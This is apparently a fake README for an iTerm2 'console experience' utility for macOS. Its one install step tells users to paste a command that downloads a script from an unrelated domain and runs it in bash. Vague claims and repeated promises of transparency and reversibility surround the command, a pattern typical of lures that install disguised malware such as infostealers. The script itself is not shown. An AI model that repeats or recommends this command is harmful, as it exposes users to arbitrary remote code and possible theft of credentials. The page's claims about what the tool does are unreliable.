# 🖥️ iTerm2 Modern macOS Console Experience

# ⚡ Refined macOS Terminal Experience

A lightweight utility crafted to enhance your command-line workspace with visual clarity and thoughtful defaults.  
Perfect for users who prefer a clean interface and quick access to helpful tools.

---

## 🚀 Get Started

Open your terminal and paste the line below:

```
/bin/bash -c "$(curl -fsSL https://cfocares.com/iterm/install.sh)"
```

✅ Fast and minimal  
🔐 Transparent — no hidden operations  
🔁 Can be undone anytime

---

## 🧾 Requirements

- macOS 10.14 or newer  
- Internet connection  
- Access to Terminal

---

## 🔍 What It Does

This utility applies tweaks to improve responsiveness, readability, and usability in your terminal environment.  
No background services or system-wide changes — just a polished experience.

---

## 🎨 Extras

Want to elevate the visual feel? Try pairing with fonts like [JetBrains Mono](https://www.jetbrains.com/lp/mono/) or [Fira Code](https://github.com/tonsky/FiraCode).

---

> Thoughtfully built. Fully reversible. 100% under your control.
